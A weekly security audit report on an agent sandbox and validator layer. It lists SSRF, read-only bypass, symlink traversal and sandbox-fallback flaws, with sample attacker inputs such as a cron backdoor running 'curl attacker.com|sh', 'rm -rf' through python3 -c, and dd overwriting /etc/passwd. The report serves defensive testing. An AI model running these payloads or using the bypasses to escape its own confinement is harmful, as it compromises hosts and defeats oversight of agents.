# Weekly deep audit — 2026-05-15

Generated by `.claude/workflows/weekly-deep-audit.sh`.

| agent | scope | status |
| --- | --- | --- |
| security-bounty-hunter | validators + sandbox + policy + signing + executors | ok |

Triage: convert any **CRITICAL** finding into a GitHub issue or fix PR before the next run.

## security-bounty-hunter

### Findings (security-bounty-hunter)

- **HIGH** SSRF — loopback and RFC1918 not blocked by default in HTTP executor
  attacker input: `{"method":"POST","url":"http://127.0.0.1:8080/admin/reset"}` or `{"url":"http://192.168.1.1/cgi-bin/upload"}`
  reachability: `Tool::HttpRequest` from an untrusted agent → `execute_http_request` (`crates/agent-guard-sdk/src/executors.rs:80`) → `resolve_url_to_safe_addr` → `is_always_blocked_ip` (line 148) explicitly skips loopback and RFC1918 by design comment (lines 145-147). Default policies that lack a deny-list for `127.*`/`10.*`/`192.168.*` permit direct internal connections.
  impact: SSRF to localhost admin endpoints, cloud metadata, and internal LAN services → credential theft / RCE on internal targets.
  remediation: Block loopback and RFC1918 inside `is_always_blocked_ip`; require explicit policy opt-in to reach them.

- **HIGH** Validator bypass — bash ReadOnly mode allows interpreter wrappers (`python3 -c`, `perl -e`, `node -e`, etc.) and quoted `LD_PRELOAD`
  attacker input: `{"command":"python3 -c \"import os; os.system('rm -rf /workspace')\""}` or `{"command":"env 'LD_PRELOAD=/tmp/e.so' cat /tmp/f"}`
  reachability: `validate_read_only` (`crates/agent-guard-validators/src/bash.rs:70`) substring-matches `LD_PRELOAD` on the raw string — defeated by quoting that splits the literal across `shell_split` tokens. `check_command_segment` (line 117) tests only `first_command` against `WRITE_COMMANDS`/`STATE_MODIFYING_COMMANDS`; `python3`/`perl`/`ruby`/`node` are not listed, so destructive operations laundered through interpreters are accepted.
  impact: Arbitrary file writes / deletions from a permission mode that is supposed to be read-only.
  remediation: Block interpreter invocations in ReadOnly, or switch to an allowlist of explicitly safe commands.

- **HIGH** Path traversal — `resolve_with_existing_ancestor` follows symlinks, then re-appends a non-canonicalized suffix
  attacker input: `{"path":"/workspace/link/../../etc/cron.d/backdoor","content":"@reboot root curl attacker.com|sh"}` where `/workspace/link → /etc`
  reachability: `resolve_with_existing_ancestor` (`crates/agent-guard-core/src/file_paths.rs:62`) canonicalizes the existing ancestor (resolves the symlink to `/etc`), then appends the unvalidated suffix `cron.d/backdoor`. The bash path validator (`bash.rs:357 validate_paths`) uses lexical `normalize_path` only and never re-checks the canonical result against the workspace root.
  impact: Workspace-write escape to arbitrary host paths once the agent stages a symlink.
  remediation: After resolving, assert the canonical path is a prefix of the canonical workspace root before opening the file; fail closed otherwise.

- **MEDIUM** Validator bypass — `write_targets_for_segment` only knows a hard-coded command list, missing `install`, `dd of=`, `rsync`, `scp`, etc.
  attacker input: `{"command":"install -m 755 /tmp/evil /etc/cron.daily/backdoor"}` or `{"command":"dd if=/dev/urandom of=/etc/passwd bs=1 count=100"}`
  reachability: `write_targets_for_segment` (`crates/agent-guard-validators/src/bash.rs:503-521`) only extracts targets for a fixed match arm; flag-style outputs (`of=`, `--output`) and unknown write tools are not seen, so WorkspaceWrite mode treats their destinations as read-only.
  impact: Writes outside the workspace using standard utilities while WorkspaceWrite confinement believes it is enforced.
  remediation: Default-deny outside-workspace writes regardless of command, and parse flag-style output args (`of=`, `--output`).

- **MEDIUM** Sandbox downgrade — default macOS / unsupported-platform builds silently fall back to `NoopSandbox` (`sh -c`)
  attacker input: any policy-Allow `Tool::Bash` payload
  reachability: `resolve_default_sandbox` (`crates/agent-guard-sdk/src/sandbox_resolution.rs:21`) returns `NoopSandbox` whenever `macos-sandbox` / `seccomp` / `windows-sandbox` features are off. `NoopSandbox::execute` (`noop.rs:31`) runs `sh -c` with no isolation.
  impact: Any validator gap above directly compromises the host with full guard-process privileges; "sandboxed" claim is false on the default macOS build.
  remediation: Emit a loud startup warning, and block execution unless the operator has explicitly opted into noop in non-test contexts.


